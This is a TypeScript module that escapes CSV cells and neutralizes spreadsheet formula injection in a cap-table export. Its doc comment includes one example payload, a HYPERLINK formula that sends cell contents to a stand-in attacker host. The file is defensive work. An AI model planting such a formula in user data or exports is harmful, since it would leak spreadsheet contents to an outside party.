/**
 * Shared CSV-cell escaping — pulled out of the cap-table export route (v0.20.0) so it's
 * independently testable and reusable by any future CSV export this app adds (see the
 * "bulk/batch export endpoints" item in the task-status spreadsheet).
 *
 * TWO SEPARATE CONCERNS, both real:
 *
 * 1. Standard CSV escaping — a value containing a comma, a double quote, or a newline
 *    must be quoted (with internal quotes doubled), or it corrupts the file's column
 *    structure. This alone was already in place before v0.20.0.
 *
 * 2. CSV/formula-injection ("CSV injection") — a value a USER entered (a stakeholder's
 *    name, a correction reason) ends up as a cell in a file that will very likely be
 *    opened in Excel or Google Sheets. Neither of those tools distinguishes "a string
 *    that happens to start with a formula-trigger character" from "an actual formula" —
 *    a stakeholder named e.g. `=HYPERLINK("http://evil.example/"&A1,"Open")` becomes a
 *    live, clickable formula the instant the export is opened, not inert text. Per
 *    OWASP's documented mitigation for this exact vulnerability class, prefixing a
 *    leading single quote on any value starting with `=`, `+`, `-`, `@`, a tab, or a
 *    carriage return neutralizes the formula interpretation.
 */

const FORMULA_TRIGGER_CHARS = /^[=+\-@\t\r]/;

/** Neutralizes a value that would otherwise be interpreted as a spreadsheet formula
 * when this CSV is opened — see the module doc comment. Safe to call on any string;
 * only prefixes values that actually start with a trigger character. */
export function neutralizeCsvFormula(value: string): string {
  return FORMULA_TRIGGER_CHARS.test(value) ? `'${value}` : value;
}

/** Full CSV-cell escaping: formula-injection neutralization first, then standard
 * quote/comma/newline quoting. Always run formula neutralization before the
 * comma/quote check — a value like `=1,2` needs its formula prefix handled before
 * deciding whether the (now-prefixed) value also needs quoting for the embedded
 * comma. */
export function escapeCsvCell(value: string): string {
  const safe = neutralizeCsvFormula(value);
  return /[",\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
